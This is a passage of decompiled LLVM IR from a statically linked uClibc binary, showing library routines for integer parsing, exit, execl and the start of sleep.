  %v3_80515fe42 = sext i8 %v2_80515fe41 to i32
  store i32 %v3_80515fe42, i32* %eax.global-to-local, align 4
  %v2_805160143 = mul nsw i32 %v3_80515fe42, 2
  %v3_805160144 = add i32 %v2_805160143, %v0_80515f3
  %v4_805160145 = inttoptr i32 %v3_805160144 to i8*
  %v5_805160146 = load i8, i8* %v4_805160145, align 1
  %v6_805160147 = and i8 %v5_805160146, 32
  %v7_805160148 = icmp eq i8 %v6_805160147, 0
  %v1_805160549 = icmp eq i1 %v7_805160148, false
  br i1 %v1_805160549, label %dec_label_pc_80515fd, label %dec_label_pc_8051607

dec_label_pc_80515fd:                             ; preds = %entry, %dec_label_pc_80515fd
  %v0_80515fd50 = phi i32 [ %v1_80515fd, %dec_label_pc_80515fd ], [ %v4_80515eb, %entry ]
  %v1_80515fd = add i32 %v0_80515fd50, 1
  store i32 %v1_80515fd, i32* %ebx.global-to-local, align 4
  %v1_80515fe = inttoptr i32 %v1_80515fd to i8*
  %v2_80515fe = load i8, i8* %v1_80515fe, align 1
  %v3_80515fe = sext i8 %v2_80515fe to i32
  store i32 %v3_80515fe, i32* %eax.global-to-local, align 4
  %v2_8051601 = mul nsw i32 %v3_80515fe, 2
  %v3_8051601 = add i32 %v2_8051601, %v0_80515f3
  %v4_8051601 = inttoptr i32 %v3_8051601 to i8*
  %v5_8051601 = load i8, i8* %v4_8051601, align 1
  %v6_8051601 = and i8 %v5_8051601, 32
  %v7_8051601 = icmp eq i8 %v6_8051601, 0
  %v1_8051605 = icmp eq i1 %v7_8051601, false
  br i1 %v1_8051605, label %dec_label_pc_80515fd, label %dec_label_pc_8051607

dec_label_pc_8051607:                             ; preds = %dec_label_pc_80515fd, %entry
  %v0_80515fd.lcssa = phi i32 [ %v4_80515eb, %entry ], [ %v1_80515fd, %dec_label_pc_80515fd ]
  %v2_80515fe.lcssa = phi i8 [ %v2_80515fe41, %entry ], [ %v2_80515fe, %dec_label_pc_80515fd ]
  %v3_80515fe.lcssa = phi i32 [ %v3_80515fe42, %entry ], [ %v3_80515fe, %dec_label_pc_80515fd ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8051607 = icmp eq i8 %v2_80515fe.lcssa, 43
  br i1 %v9_8051607, label %dec_label_pc_8051622, label %dec_label_pc_805160c

dec_label_pc_805160c:                             ; preds = %dec_label_pc_8051607
  %v9_805160c = icmp eq i8 %v2_80515fe.lcssa, 45
  %v1_8051614 = icmp eq i1 %v9_805160c, false
  br i1 %v1_8051614, label %dec_label_pc_8051623, label %dec_label_pc_8051622

dec_label_pc_8051622:                             ; preds = %dec_label_pc_8051607, %dec_label_pc_805160c
  %storemerge5 = phi i8 [ 1, %dec_label_pc_805160c ], [ 0, %dec_label_pc_8051607 ]
  %v1_8051622 = add i32 %v0_80515fd.lcssa, 1
  store i32 %v1_8051622, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051623

dec_label_pc_8051623:                             ; preds = %dec_label_pc_805160c, %dec_label_pc_8051622
  %v0_8051635 = phi i32 [ %v1_8051622, %dec_label_pc_8051622 ], [ %v0_80515fd.lcssa, %dec_label_pc_805160c ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8051622 ], [ 0, %dec_label_pc_805160c ]
  %v1_8051623 = and i32 %arg3, -17
  %v2_8051623 = icmp eq i32 %v1_8051623, 0
  %v1_805162b = icmp eq i1 %v2_8051623, false
  br i1 %v1_805162b, label %dec_label_pc_8051651, label %dec_label_pc_805162d

dec_label_pc_805162d:                             ; preds = %dec_label_pc_8051623
  %v1_805162d = add i32 %arg3, 10
  store i32 %v1_805162d, i32* %esi.global-to-local, align 4
  %v1_8051630 = inttoptr i32 %v0_8051635 to i8*
  %v2_8051630 = load i8, i8* %v1_8051630, align 1
  %v8_8051630 = icmp eq i8 %v2_8051630, 48
  %v1_8051633 = icmp eq i1 %v8_8051630, false
  br i1 %v1_8051633, label %dec_label_pc_8051646, label %dec_label_pc_8051635

dec_label_pc_8051635:                             ; preds = %dec_label_pc_805162d
  %v1_8051635 = add i32 %v0_8051635, 1
  store i32 %v1_8051635, i32* %ebx.global-to-local, align 4
  %v1_8051636 = add i32 %arg3, 8
  store i32 %v1_8051636, i32* %esi.global-to-local, align 4
  %v1_8051639 = inttoptr i32 %v1_8051635 to i8*
  %v2_8051639 = load i8, i8* %v1_8051639, align 1
  %v2_805163d = or i8 %v2_8051639, 32
  %v7_805163d = zext i8 %v2_805163d to i32
  %v9_805163d = and i32 %v3_80515fe.lcssa, -256
  %v10_805163d = or i32 %v7_805163d, %v9_805163d
  store i32 %v10_805163d, i32* %eax.global-to-local, align 4
  %v10_805163f = icmp eq i8 %v2_805163d, 120
  %v1_8051641 = icmp eq i1 %v10_805163f, false
  br i1 %v1_8051641, label %dec_label_pc_8051646, label %dec_label_pc_8051643

dec_label_pc_8051643:                             ; preds = %dec_label_pc_8051635
  %v2_8051643 = mul i32 %v1_8051636, 2
  store i32 %v2_8051643, i32* %esi.global-to-local, align 4
  %v1_8051645 = add i32 %v0_8051635, 2
  store i32 %v1_8051645, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051646

dec_label_pc_8051646:                             ; preds = %dec_label_pc_8051635, %dec_label_pc_805162d, %dec_label_pc_8051643
  %v0_805166e13 = phi i32 [ %v1_8051635, %dec_label_pc_8051635 ], [ %v0_8051635, %dec_label_pc_805162d ], [ %v1_8051645, %dec_label_pc_8051643 ]
  %v0_80516c822 = phi i32 [ %v1_8051635, %dec_label_pc_8051635 ], [ %v4_80515eb, %dec_label_pc_805162d ], [ %v1_8051635, %dec_label_pc_8051643 ]
  %v3_805164e = phi i32 [ %v1_8051636, %dec_label_pc_8051635 ], [ %v1_805162d, %dec_label_pc_805162d ], [ %v2_8051643, %dec_label_pc_8051643 ]
  %v1_8051646 = add i32 %v3_805164e, -17
  %v6_8051646 = sub i32 16, %v3_805164e
  %v7_8051646 = and i32 %v6_8051646, %v3_805164e
  %v8_8051646 = icmp slt i32 %v7_8051646, 0
  %v10_8051646 = icmp slt i32 %v1_8051646, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_805164e = icmp eq i1 %v10_8051646, %v8_8051646
  %v5_805164e = select i1 %v2_805164e, i32 16, i32 %v3_805164e
  store i32 %v5_805164e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051651

dec_label_pc_8051651:                             ; preds = %dec_label_pc_8051623, %dec_label_pc_8051646
  %v0_80516c823 = phi i32 [ %v4_80515eb, %dec_label_pc_8051623 ], [ %v0_80516c822, %dec_label_pc_8051646 ]
  %v0_805166e12 = phi i32 [ %v0_8051635, %dec_label_pc_8051623 ], [ %v0_805166e13, %dec_label_pc_8051646 ]
  %v0_8051660 = phi i32 [ %arg3, %dec_label_pc_8051623 ], [ %v5_805164e, %dec_label_pc_8051646 ]
  %v1_8051651 = add i32 %v0_8051660, -2
  store i32 %v1_8051651, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8051659 = icmp ugt i32 %v1_8051651, 34
  br i1 %v6_8051659, label %dec_label_pc_80516bd, label %dec_label_pc_805165b

dec_label_pc_805165b:                             ; preds = %dec_label_pc_8051651
  %div = udiv i32 -1, %v0_8051660
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8051660
  %v1_8051662 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_805169b = urem i32 %arg4, 256
  br label %dec_label_pc_805166e

dec_label_pc_805166c:                             ; preds = %dec_label_pc_80516b3, %dec_label_pc_805169b
  %v2_8051670.pre = phi i32 [ %v0_80516b6, %dec_label_pc_80516b3 ], [ %v2_8051670.pre.pre, %dec_label_pc_805169b ]
  %v4_805166e.pre = phi i32 [ %v1_8051687, %dec_label_pc_80516b3 ], [ %v4_805166e.pre.pre, %dec_label_pc_805169b ]
  %v0_805166c = phi i32 [ %v1_805168e, %dec_label_pc_80516b3 ], [ %v0_805166c.pre, %dec_label_pc_805169b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_80516b3 ], [ %v6_805169f, %dec_label_pc_805169b ]
  br label %dec_label_pc_805166e

dec_label_pc_805166e:                             ; preds = %dec_label_pc_805165b, %dec_label_pc_805166c
  %v0_80516c821 = phi i32 [ %v0_80516c823, %dec_label_pc_805165b ], [ %v0_805166c, %dec_label_pc_805166c ]
  %v0_805168e = phi i32 [ %v0_805166e12, %dec_label_pc_805165b ], [ %v0_805166c, %dec_label_pc_805166c ]
  %v2_8051670 = phi i32 [ %v4_80515eb, %dec_label_pc_805165b ], [ %v2_8051670.pre, %dec_label_pc_805166c ]
  %v4_805166e = phi i32 [ %div, %dec_label_pc_805165b ], [ %v4_805166e.pre, %dec_label_pc_805166c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_805165b ], [ %stack_var_-18.1, %dec_label_pc_805166c ]
  %v1_805166e = inttoptr i32 %v0_805168e to i8*
  %v2_805166e = load i8, i8* %v1_805166e, align 1
  %v3_805166e = zext i8 %v2_805166e to i32
  %v5_805166e = and i32 %v4_805166e, -256
  %v6_805166e = or i32 %v3_805166e, %v5_805166e
  store i32 %v6_805166e, i32* %eax.global-to-local, align 4
  %v2_8051672 = add i8 %v2_805166e, -48
  %v12_8051672 = zext i8 %v2_8051672 to i32
  %v14_8051672 = and i32 %v2_8051670, -256
  %v15_8051672 = or i32 %v12_8051672, %v14_8051672
  store i32 %v15_8051672, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8051672, 10
  br i1 %tmp, label %dec_label_pc_8051687, label %dec_label_pc_805167a

dec_label_pc_805167a:                             ; preds = %dec_label_pc_805166e
  %v2_805167a = or i8 %v2_805166e, 32
  %v7_805167a = zext i8 %v2_805167a to i32
  %v10_805167a = or i32 %v7_805167a, %v5_805166e
  store i32 %v10_805167a, i32* %eax.global-to-local, align 4
  %v2_805167c = or i32 %v14_8051672, 40
  store i32 %v2_805167c, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_805167a, 97
  br i1 %tmp55, label %dec_label_pc_8051687, label %dec_label_pc_8051682

dec_label_pc_8051682:                             ; preds = %dec_label_pc_805167a
  %v2_8051684 = add i8 %v2_805167a, -87
  %v15_8051684 = zext i8 %v2_8051684 to i32
  %v18_8051684 = or i32 %v15_8051684, %v14_8051672
  store i32 %v18_8051684, i32* @ecx, align 4
  br label %dec_label_pc_8051687

dec_label_pc_8051687:                             ; preds = %dec_label_pc_805167a, %dec_label_pc_805166e, %dec_label_pc_8051682
  %v0_80516b6 = phi i32 [ %v2_805167c, %dec_label_pc_805167a ], [ %v15_8051672, %dec_label_pc_805166e ], [ %v18_8051684, %dec_label_pc_8051682 ]
  %v1_8051687 = urem i32 %v0_80516b6, 256
  store i32 %v1_8051687, i32* %eax.global-to-local, align 4
  %v1_805168a = load i32, i32* %esi.global-to-local, align 4
  %v2_805168a = sub i32 %v1_8051687, %v1_805168a
  %v10_805168a = and i32 %v2_805168a, %v1_805168a
  %v11_805168a = icmp slt i32 %v10_805168a, 0
  %v13_805168a = icmp slt i32 %v2_805168a, 0
  %v2_805168c = icmp eq i1 %v13_805168a, %v11_805168a
  br i1 %v2_805168c, label %dec_label_pc_80516bd, label %dec_label_pc_805168e

dec_label_pc_805168e:                             ; preds = %dec_label_pc_8051687
  %v1_805168e = add i32 %v0_805168e, 1
  store i32 %v1_805168e, i32* %ebx.global-to-local, align 4
  %v0_805168f = load i32, i32* %edx.global-to-local, align 4
  %v1_805168f = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_805168f, %v1_805168f
  br i1 %tmp56, label %dec_label_pc_805169b, label %dec_label_pc_8051693

dec_label_pc_8051693:                             ; preds = %dec_label_pc_805168e
  %v12_805168f = icmp eq i32 %v0_805168f, %v1_805168f
  %v1_8051693 = icmp eq i1 %v12_805168f, false
  br i1 %v1_8051693, label %dec_label_pc_80516b3, label %dec_label_pc_8051695

dec_label_pc_8051695:                             ; preds = %dec_label_pc_8051693
  %v1_8051695 = trunc i32 %v0_80516b6 to i8
  %tmp57 = icmp ugt i8 %v1_8051695, %v1_8051662
  br i1 %tmp57, label %dec_label_pc_805169b, label %dec_label_pc_80516b3

dec_label_pc_805169b:                             ; preds = %dec_label_pc_8051695, %dec_label_pc_805168e
  store i32 %v4_805169b, i32* %eax.global-to-local, align 4
  %v6_805169f = and i8 %stack_var_-18.2, %tmp37
  %v1_80516a3 = sext i8 %v6_805169f to i32
  %v2_80516a3 = call i32 @__errno_location(i32 %v1_80516a3)
  store i32 %v2_80516a3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80516ab = inttoptr i32 %v2_80516a3 to i32*
  store i32 34, i32* %v1_80516ab, align 4
  %v0_805166c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805166e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8051670.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805166c

dec_label_pc_80516b3:                             ; preds = %dec_label_pc_8051695, %dec_label_pc_8051693
  %v4_80516b3 = mul i32 %v0_805168f, %v1_805168a
  store i32 %v1_8051687, i32* %eax.global-to-local, align 4
  %v2_80516b9 = add i32 %v4_80516b3, %v1_8051687
  store i32 %v2_80516b9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805166c

dec_label_pc_80516bd:                             ; preds = %dec_label_pc_8051687, %dec_label_pc_8051651
  %v0_80516c8 = phi i32 [ %v0_80516c823, %dec_label_pc_8051651 ], [ %v0_80516c821, %dec_label_pc_8051687 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8051651 ], [ %stack_var_-18.2, %dec_label_pc_8051687 ]
  %v4_80516bd = icmp eq i32 %arg2, 0
  br i1 %v4_80516bd, label %dec_label_pc_80516ca, label %dec_label_pc_80516c4

dec_label_pc_80516c4:                             ; preds = %dec_label_pc_80516bd
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80516c8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80516c8, i32* %v2_80516c8, align 4
  br label %dec_label_pc_80516ca

dec_label_pc_80516ca:                             ; preds = %dec_label_pc_80516bd, %dec_label_pc_80516c4
  %v8_80516ca = icmp eq i8 %stack_var_-18.3, 0
  %v2_80516cf = zext i1 %v8_80516ca to i32
  %v13_80516cf = icmp eq i1 %v8_80516ca, false
  %v1_80516d13 = or i32 %v2_80516cf, -2147483648
  store i32 %v1_80516d13, i32* %ebx.global-to-local, align 4
  %v5_80516d7 = icmp eq i8 %tmp37, 0
  br i1 %v5_80516d7, label %dec_label_pc_80516ef, label %dec_label_pc_80516de

dec_label_pc_80516de:                             ; preds = %dec_label_pc_80516ca
  %v0_80516de = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_80516de, %v1_80516d13
  br i1 %tmp58, label %dec_label_pc_80516e2, label %dec_label_pc_80516ef

dec_label_pc_80516e2:                             ; preds = %dec_label_pc_80516de
  %v1_80516e2 = sext i8 %stack_var_-18.3 to i32
  %v2_80516e2 = call i32 @__errno_location(i32 %v1_80516e2)
  store i32 %v2_80516e2, i32* %eax.global-to-local, align 4
  %v0_80516e7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80516e7, i32* %edx.global-to-local, align 4
  %v1_80516e9 = inttoptr i32 %v2_80516e2 to i32*
  store i32 34, i32* %v1_80516e9, align 4
  br label %dec_label_pc_80516ef

dec_label_pc_80516ef:                             ; preds = %dec_label_pc_80516de, %dec_label_pc_80516ca, %dec_label_pc_80516e2
  %v0_80516ef = load i32, i32* %edx.global-to-local, align 4
  %v1_80516f1 = sub i32 0, %v0_80516ef
  %v4_80516f8 = select i1 %v13_80516cf, i32 %v1_80516f1, i32 %v0_80516ef
  store i32 %v4_80516f8, i32* @edx, align 4
  %v2_80516fe = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80516fe, i32* @ebx, align 4
  store i32 %v4_80516f8, i32* %eax.global-to-local, align 4
  ret i32 %v4_80516f8

; uselistorder directives
  uselistorder i32 %v4_80516f8, { 1, 0, 2 }
  uselistorder i1 %v8_80516ca, { 1, 0 }
  uselistorder i8 %v6_805169f, { 1, 0 }
  uselistorder i32 %v1_805168f, { 1, 0 }
  uselistorder i32 %v0_805168f, { 2, 1, 0 }
  uselistorder i32 %v1_805168e, { 1, 0 }
  uselistorder i32 %v2_805168a, { 1, 0 }
  uselistorder i32 %v1_8051687, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80516b6, { 2, 0, 1 }
  uselistorder i8 %v2_805167a, { 1, 0, 2 }
  uselistorder i32 %v14_8051672, { 0, 2, 1 }
  uselistorder i32 %v0_805166c, { 1, 0 }
  uselistorder i32 %v0_8051660, { 1, 0, 2 }
  uselistorder i32 %v3_805164e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8051643, { 1, 0 }
  uselistorder i32 %v1_8051636, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8051635, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_80515fe.lcssa, { 1, 0 }
  uselistorder i32 %v0_80515fd.lcssa, { 1, 0 }
  uselistorder i32 %v1_80515fd, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80515f3, { 1, 0, 2 }
  uselistorder i32 %v4_80515eb, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80516ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80516ca, { 1, 0 }
  uselistorder label %dec_label_pc_8051687, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805166e, { 1, 0 }
  uselistorder label %dec_label_pc_8051651, { 1, 0 }
  uselistorder label %dec_label_pc_8051646, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051623, { 1, 0 }
  uselistorder label %dec_label_pc_8051622, { 1, 0 }
  uselistorder label %dec_label_pc_80515fd, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805171b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805171b, i32* @ebx, align 4
  %v2_8051720 = call i32 @__pthread_return_void(i32 %v2_805171b, i32 134552351)
  %v1_805172c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a020.217 to i32))
  %v0_8051731 = load i32, i32* @global_var_80602c4.218, align 4
  store i32 %v0_8051731, i32* @eax, align 4
  %v1_8051739 = icmp eq i32 %v0_8051731, 0
  br i1 %v1_8051739, label %dec_label_pc_8051746, label %dec_label_pc_805173d

dec_label_pc_805173d:                             ; preds = %entry
  %v0_8051740 = load i32, i32* @esi, align 4
  %v1_8051741 = call i32 @unknown_0(i32 %v0_8051740)
  store i32 %v1_8051741, i32* @eax, align 4
  br label %dec_label_pc_8051746

dec_label_pc_8051746:                             ; preds = %entry, %dec_label_pc_805173d
  %v2_805174b = call i32 @__pthread_return_void(i32 %v2_805171b, i32 1)
  %v0_8051750 = call i32 @__GI___uClibc_fini()
  %v0_8051761 = call i32 @_stdio_term()
  %v0_8051769 = load i32, i32* @esi, align 4
  %v1_805176a = call i32 @__GI__exit(i32 %v0_8051769)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051746, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8051776 = load i32, i32* @ebx, align 4
  store i32 %v0_8051776, i32* %stack_var_-12, align 4
  %v2_8051777 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8051777, i32* %eax.global-to-local, align 4
  %v12_805177a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051780

dec_label_pc_8051780:                             ; preds = %dec_label_pc_8051780, %entry
  %v0_8051783 = phi i32 [ 0, %entry ], [ %v1_8051783, %dec_label_pc_8051780 ]
  %stack_var_-16.0 = phi i32 [ %v2_8051777, %entry ], [ %v1_8051784, %dec_label_pc_8051780 ]
  %v1_8051783 = add i32 %v0_8051783, 1
  store i32 %v1_8051783, i32* %esi.global-to-local, align 4
  %v1_8051784 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8051784, i32* %eax.global-to-local, align 4
  %v1_805178a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_805178a = load i32, i32* %v1_805178a, align 4
  %v3_805178a = icmp eq i32 %v2_805178a, 0
  %v1_805178d = icmp eq i1 %v3_805178a, false
  br i1 %v1_805178d, label %dec_label_pc_8051780, label %dec_label_pc_805178f

dec_label_pc_805178f:                             ; preds = %dec_label_pc_8051780
  %v1_805178f = mul i32 %v1_8051783, 4
  %v2_805178f = add i32 %v1_805178f, 34
  %v1_8051796 = and i32 %v2_805178f, -16
  %v2_8051799 = sub i32 %v12_805177a, %v1_8051796
  %v1_805179e = add i32 %v2_8051799, 15
  %v1_80517a2 = and i32 %v1_805179e, -16
  store i32 %v1_80517a2, i32* @ebx, align 4
  store i32 %v1_80517a2, i32* %ecx.global-to-local, align 4
  %v2_80517a7 = inttoptr i32 %v1_80517a2 to i32*
  store i32 %arg2, i32* %v2_80517a7, align 16
  store i32 %v2_8051777, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80517af

dec_label_pc_80517af:                             ; preds = %dec_label_pc_80517af, %dec_label_pc_805178f
  %stack_var_-16.1 = phi i32 [ %v2_8051777, %dec_label_pc_805178f ], [ %v1_80517b6, %dec_label_pc_80517af ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80517b2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80517b2 = add i32 %v0_80517b2, 4
  store i32 %v1_80517b2, i32* %ecx.global-to-local, align 4
  %v0_80517b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80517b5 = add i32 %v0_80517b5, -1
  %v8_80517b5 = icmp eq i32 %v1_80517b5, 0
  store i32 %v1_80517b5, i32* %esi.global-to-local, align 4
  %v1_80517b6 = add i32 %stack_var_-16.1, 4
  %v1_80517bc = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80517bc = load i32, i32* %v1_80517bc, align 4
  store i32 %v2_80517bc, i32* %eax.global-to-local, align 4
  %v2_80517be = inttoptr i32 %v1_80517b2 to i32*
  store i32 %v2_80517bc, i32* %v2_80517be, align 4
  %v1_80517c0 = icmp eq i1 %v8_80517b5, false
  br i1 %v1_80517c0, label %dec_label_pc_80517af, label %dec_label_pc_80517c2

dec_label_pc_80517c2:                             ; preds = %dec_label_pc_80517af
  %v0_80517c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80517c2 = load i32, i32* @esp, align 4
  %v2_80517c2 = add i32 %v1_80517c2, -4
  %v3_80517c2 = inttoptr i32 %v2_80517c2 to i32*
  store i32 %v0_80517c2, i32* %v3_80517c2, align 4
  %v0_80517c3 = load i32, i32* @global_var_80602cc.219, align 4
  %v2_80517c3 = add i32 %v1_80517c2, -8
  %v3_80517c3 = inttoptr i32 %v2_80517c3 to i32*
  store i32 %v0_80517c3, i32* %v3_80517c3, align 4
  %v0_80517c9 = load i32, i32* @ebx, align 4
  %v2_80517c9 = add i32 %v1_80517c2, -12
  %v3_80517c9 = inttoptr i32 %v2_80517c9 to i32*
  store i32 %v0_80517c9, i32* %v3_80517c9, align 4
  %v5_80517ca = add i32 %v1_80517c2, -16
  %v6_80517ca = inttoptr i32 %v5_80517ca to i32*
  store i32 %arg1, i32* %v6_80517ca, align 4
  %v1_80517cd = inttoptr i32 %v1_80517b6 to i8*
  %v2_80517cd = call i32 @__GI_execve(i8* %v1_80517cd)
  store i32 %v2_80517cd, i32* %eax.global-to-local, align 4
  %v2_80517d5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80517d5, i32* @ebx, align 4
  ret i32 %v2_80517cd

; uselistorder directives
  uselistorder i32 %v1_80517b5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8051784, { 1, 0 }
  uselistorder i32 %v1_8051783, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8051777, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_80517e2 = load i32, i32* @edi, align 4
  %v0_80517e3 = load i32, i32* @esi, align 4
  %v0_80517e4 = load i32, i32* @ebx, align 4
  %v15_80517e5 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80517f2 = icmp eq i32 %arg1, 0
  %v1_80517f4 = icmp eq i1 %v1_80517f2, false
  br i1 %v1_80517f4, label %dec_label_pc_8051806.preheader, label %dec_label_pc_8051953

dec_label_pc_8051806.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80517fb

dec_label_pc_80517fb:                             ; preds = %dec_label_pc_80517fb.dec_label_pc_80517fb_crit_edge, %dec_label_pc_8051806.preheader
  %v0_80517fb = phi i32 [ %v15_80517e5, %dec_label_pc_8051806.preheader ], [ %v0_80517fb.pre, %dec_label_pc_80517fb.dec_label_pc_80517fb_crit_edge ]
  %v1_805180627 = phi i32 [ 31, %dec_label_pc_8051806.preheader ], [ %v1_8051806, %dec_label_pc_80517fb.dec_label_pc_80517fb_crit_edge ]
  %v2_80517fb = mul i32 %v1_805180627, 4
  %v3_80517fb = add i32 %v2_80517fb, 292
  %v4_80517fb = add i32 %v3_80517fb, %v0_80517fb
  %v5_80517fb = inttoptr i32 %v4_80517fb to i32*
  store i32 0, i32* %v5_80517fb, align 4
  %v0_8051806.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051806 = add i32 %v0_8051806.pre, -1
  %v9_8051806 = icmp slt i32 %v1_8051806, 0
  store i32 %v1_8051806, i32* %eax.global-to-local, align 4
  %v1_8051807 = icmp eq i1 %v9_8051806, false
  br i1 %v1_8051807, label %dec_label_pc_80517fb.dec_label_pc_80517fb_crit_edge, label %dec_label_pc_8051809

dec_label_pc_80517fb.dec_label_pc_80517fb_crit_edge: ; preds = %dec_label_pc_80517fb
  %v0_80517fb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517fb

dec_label_pc_8051809:                             ; preds = %dec_label_pc_80517fb
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805181f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805181f, i32* @ebx, align 4
  store i32 %v2_805181f, i32* %stack_var_-460, align 4
  %v4_8051827 = call i32 @__sigaddset(i32 %v2_805181f, i32 17, i32 %v1_8051806, i32 %v1_8051806)
  store i32 %v4_8051827, i32* %eax.global-to-local, align 4
  %v2_805182f = icmp slt i32 %v4_8051827, 0
  br i1 %v2_805182f, label %dec_label_pc_8051957, label %dec_label_pc_8051837

dec_label_pc_8051837:                             ; preds = %dec_label_pc_8051809
  %v2_8051838 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8051838, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051843 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051843 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8051843, i32 %v2_8051838)
  store i32 %v4_8051843, i32* %eax.global-to-local, align 4
  %v1_805184b = icmp eq i32 %v4_8051843, 0
  %v1_805184d = icmp eq i1 %v1_805184b, false
  br i1 %v1_805184d, label %dec_label_pc_8051957, label %dec_label_pc_8051853

dec_label_pc_8051853:                             ; preds = %dec_label_pc_8051837
  store i32 %v2_8051838, i32* %stack_var_-460, align 4
  %v4_8051858 = call i32 @__sigismember(i32 %v2_8051838, i32 17, i32 %v4_8051843, i32 %v4_8051843)
  store i32 %v4_8051858, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051865 = icmp eq i32 %v4_8051858, 0
  br i1 %v1_8051865, label %dec_label_pc_8051879.preheader, label %dec_label_pc_8051921

dec_label_pc_8051879.preheader:                   ; preds = %dec_label_pc_8051853
